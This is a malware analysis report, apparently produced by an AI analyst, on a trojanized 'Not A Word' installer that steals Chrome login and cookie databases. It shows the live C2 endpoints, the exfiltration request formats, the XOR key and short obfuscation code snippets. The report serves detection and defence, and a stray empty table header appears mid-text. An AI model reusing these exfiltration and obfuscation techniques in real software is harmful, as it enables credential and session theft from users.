# NotAWord.exe — Malware Analysis Report

**Date:** 2026-03-03
**Analyst:** Claude Code (REMnux)
**Classification:** Chrome Cookie/Credential Hijacker Trojan — **HIGH confidence**

---

## Executive Summary

`NotAWord.exe` is a trojanized installer disguised as a "Not A Word" word-game setup wizard. Behind a polished WPF installer UI, it silently steals Chrome `Login Data` and `Cookies` databases, exfiltrates them to a hidden C2 server, receives attacker-modified files in return, and injects them back into the victim's Chrome profile — hijacking live web sessions. A legitimate word game is bundled and launched as cover.

## Execution Flow

When run, the installer presents a polished 3-page wizard (`FirstPage` → `SecondPage` → `ConfirmPage`). The malicious logic is driven by `SecondPage.ExtractFile()` on wizard page 2.

### Stage 1 — Initial Beacon (`/hello`)

`BE_handler.PostInit()` fires immediately:

```
POST https://psotimim.com/hello
```

Response (JSON): `{ "video": "...", "child": "...", "sild": "...", "dlbr": "..." }`

These operator-controlled fields gate subsequent behaviour. `dlbr` is used to confirm Chrome is the target browser (`dlbr.StartsWith("c")`).

---

### Stage 2 — Chrome Eligibility Check

`Helper.IsTryableUser()` checks four registry keys (all obfuscated via string-reversal) to confirm Google Chrome is installed:

```
SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe
SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe
SOFTWARE\Microsoft\Windows\CurrentVersion\Install\GoogleChrome
SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Install\GoogleChrome
```

If `i01 == "true"` (NotAWord.exe already present in the install path), the theft is skipped — the sample avoids re-attacking previously compromised victims.

---

### Stage 3 — Chrome Credential Theft (`PerformMerge`)

> **Operator-gated:** only executes if the C2 returns `IsRegisteredUser = true`.

This is the core attack, implemented in `UnifiedProcessor.PerformMerge()`:

1. **Contact hidden C2 init endpoint:**
   ```
   POST https://nap.psotimim.com/notastart
   Body: { "ID": "<victim-uuid>" }
   ```
   Response: `MemberSettingsResponse` → contains `MergeResponse` (a nested XOR-encrypted config).

2. **Decrypt C2 config** using XOR key `CSIRELSCSIRELS-x1364481266` + custom reversed base64 alphabet. Decrypted fields provide Chrome profile path components:
   - `MainOffset` — path to Chrome User Data directory
   - `OffsetL` — subpath to profile list file (`Local State`)
   - `Col1`, `Col2` — JSON keys for parsing the profile list
   - `OffsetS` — per-profile path suffix for file 1 (likely `Login Data`)
   - `OffsetR` — per-profile path suffix for file 2 (likely `Cookies`)

3. **Kill all Chrome processes** via `PerformanceCounter("Process")` PID enumeration, then `Process.Kill()`.

4. **Wait 5 seconds** for file locks to release.

5. **Enumerate Chrome profiles** by reading and parsing the `Local State` JSON file.

6. **For each profile**, read two database files (Login Data + Cookies SQLite DBs) using COM `ADO Stream` objects (bypasses .NET `File.*` API hooks).

7. **Encrypt and exfiltrate** to hidden C2:
   ```
   POST https://nap.psotimim.com/ntawd
   Body (XOR+base64 encoded): {
     "UserName": "<Windows SID>",
     "ID": "<victim-uuid>",
     "File1S": "<base64 of db file 1>",
     "File2R": "<base64 of db file 2>"
   }
   ```

8. **Receive modified file** — C2 responds with `PdfMergeInfoResponse.MergedFile`, a base64-encoded replacement database (likely with attacker session cookies injected).

9. **Atomic file replacement** — waits 15 seconds, then uses `ComFileOps.ReplaceFile()` to atomically overwrite the victim's Chrome database with the C2-provided version.

10. **Relaunch Chrome** with `--hide-crash-restore-bubble --restore-last-session`, so the victim sees Chrome open normally.

### Stage 4 — Payload Delivery (Cover)

```
POST https://psotimim.com/nawnat
```

Response: base64-encoded ZIP archive, extracted via COM Shell to `%LOCALAPPDATA%\Not A Word\`. Contains the legitimate word game (`NotAWord.exe`, `Updater.exe`, `Uninstaller.exe`). The game is launched immediately after installation to complete the deception.

| Endpoint | Type | Purpose |

## Obfuscation Techniques

### 1. `ConstructString()` — Reversed String Reassembly

All C2 URLs and registry key paths are stored as reversed string chunks and reconstructed at runtime:

```csharp
private static string ConstructString(string[] chunks) {
    Array.Reverse(chunks);                           // reverse chunk order
    for (int i = 0; i < chunks.Length; i++)
        chunks[i] = new string(chunks[i].Reverse()); // reverse each chunk
    return string.Concat(chunks);
}
```

Examples:
- `["tratsaton/", "moc.mimitosp.pan"]` → `nap.psotimim.com/notastart`
- `["dwatn/", "moc.mimitosp.pan"]` → `nap.psotimim.com/ntawd`
- `["emorhc"]` → `chrome`

### 2. XOR Cipher + Custom Base64 Alphabet

All data exchanged with the hidden C2 endpoints is encrypted:
- **XOR key:** `CSIRELSCSIRELS-x1364481266` (26 bytes, cycling)
- **Base64 alphabet:** standard alphabet stored as three reversed strings, reassembled — identical `ConstructString()` trick applied to the character table

### 3. Hardcoded Byte Arrays

Chrome executable paths are stored as `byte[]` literals rather than plaintext strings:
```csharp
byte[] bytes = new byte[53] { 67, 58, 92, 80, 114, ... };
// decodes to: C:\Program Files\Google\Chrome\Application\chrome.exe
```

### 4. Base64-Encoded Registry Paths

Sensitive registry key paths stored as base64:
- `U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24=` → `SOFTWARE\Microsoft\Windows NT\CurrentVersion`
- `U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXA==` → `Software\Microsoft\Windows\CurrentVersion\Uninstall\`

### 5. COM-Based File I/O

All Chrome database access uses `FileSystemObject` (CLSID `0D43FE01-...`) and `ADO Stream` (CLSID `00000566-...`) COM objects instead of .NET `System.IO` APIs, likely to bypass API-level file monitoring hooks.

### 6. Obfuscated Field Names

Internal state variables use meaningless names: `u_x1`, `osv_x2`, `fttao`, `fftan`, `ftaac`, `is_typo`, `n5p5t`, `dlbr`, `sim_stts`, `ins_scr_c`.

## Code Signing Note

The sample carries a **valid, non-expired Sectigo Extended Validation (EV)** code signing certificate:

- **Subject:** Astro Bright LTD, Tel Aviv, Israel
- **Registration:** IL-516185469
- **Valid:** 2025-05-21 → 2026-05-21
- **Timestamp:** 2025-10-29

An EV certificate — as opposed to the 3-day Microsoft Trusted Signing certs seen in the IoTrust/DIDS samples — would allow this file to pass Windows SmartScreen and many AV solutions without warnings. The "Astro Bright LTD" entity may be a shell company created specifically for certificate acquisition, or a compromised legitimate company's identity.
